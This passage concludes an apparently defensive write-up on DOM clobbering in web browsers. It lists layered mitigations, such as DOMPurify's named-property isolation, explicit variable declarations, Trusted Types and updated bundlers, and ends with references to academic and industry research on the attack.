1. **The specification mandates the behavior**: Browsers cannot remove named access without breaking the web.
2. **Every JavaScript library is a potential gadget**: Any code pattern that reads an undefined global variable or accesses `document.*` without type validation creates a clobbering opportunity.
3. **HTML sanitizers provide incomplete protection**: popular sanitizers can be vulnerable to clobbering markup by default, and CSP cannot mitigate many identified DOM clobbering vulnerabilities.

### Structural Solutions

A comprehensive defense requires layered controls at multiple levels:

1. **Sanitizer-level**: Enable strict namespace isolation (DOMPurify `SANITIZE_NAMED_PROPS: true`) to prefix all `id` and `name` attributes with `user-content-`.
2. **Code-level**: Never reference undefined global variables; always use explicit `var`/`let`/`const` declarations; validate types with `instanceof` before security-sensitive operations; avoid `window.x || default` patterns.
3. **CSP-level**: While CSP alone cannot prevent DOM Clobbering, combining `strict-dynamic` with Trusted Types policies closes many gadget exploitation paths.
4. **Build tool-level**: Ensure bundlers (Webpack, Rollup, Vite) are updated past their respective DOM Clobbering patches; validate `document.currentScript.tagName` in custom build plugins.
5. **Specification-level**: The ultimate fix would be a browser opt-in mechanism (similar to `Cross-Origin-Opener-Policy`) that disables named property access for modern applications. No such mechanism currently exists.

---

## References

- USENIX Security '25: "Detecting and Exploiting DOM Clobbering Gadgets via Concolic Execution with Symbolic DOM" (Hulk)
- IEEE S&P 2023: "It's (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses" (TheThing) — Distinguished Paper Award
- DEF CON 33: "The DOMino Effect: Automated Detection and Exploitation of DOM Clobbering Vulnerability at Scale"
- PortSwigger Research: "DOM Clobbering Strikes Back" — Advanced techniques including iframe srcdoc, anchor URL properties, protocol-based encoding bypass
- PortSwigger Research: "Bypassing CSP via DOM Clobbering" — strict-dynamic exploitation through nonce-protected gadgets
- OWASP: DOM Clobbering Prevention Cheat Sheet
- WHATWG HTML Living Standard: Named Access on the Window Object (§7.3.3)
- Real-World Exploit Chain: "Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild" (2024)
- DOMPurify Research: "Exploring the DOMPurify library: Bypasses and Fixes" (mizu.re, 2024)
- domclob.xyz: DOM Clobbering Wiki and Payload Generator

---

*This document was created for defensive security research and vulnerability understanding purposes.*
